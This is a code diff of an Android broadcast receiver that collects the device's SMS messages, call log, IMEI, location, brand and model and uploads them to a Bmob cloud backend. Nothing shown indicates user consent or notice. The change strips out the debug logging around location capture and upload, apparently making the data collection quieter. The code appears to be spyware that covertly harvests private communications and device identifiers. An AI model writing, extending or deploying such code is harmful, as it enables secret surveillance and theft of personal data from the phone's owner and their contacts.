@@ -141,7 +141,6 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
      * 获取当前位置信息
      */
     private void getLocationData() {
-        Log.e("MyBroadcastReceiver", "获取定位信息");
         M_Presenter.CurrentLocation currentLocation = new CurrentLocationImpl(this);
         currentLocation.getLocation(context);
     }
@@ -176,11 +175,10 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
                 fd.setBelongTo(clientUser);
                 fd.setSmsLog(tools.getSmsInPhone());
                 fd.setCallLog(tools.getCallDataList());
-                fd.setModel(tools.getModel());
+                fd.setModel(tools.getBrand() + "\t" + tools.getModel());
                 fd.setNetType(tools.getNetType());
                 fd.setImei(tools.getImei());
                 Thread.sleep(10000);
-                Log.e("MyBroadcastReceiver", "开始上传数据");
                 fd.save(new SaveListener<String>() {
                     @Override
                     public void done(String s, BmobException e) {
@@ -204,9 +202,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
         clientUser.update(objId, new UpdateListener() {
             @Override
             public void done(BmobException e) {
-                if (e == null) {
-                    Log.e("MyBroadcastReceiver", "操作完成！");
-                } else {
+                if (e != null) {
                     upConsole();
                 }
             }
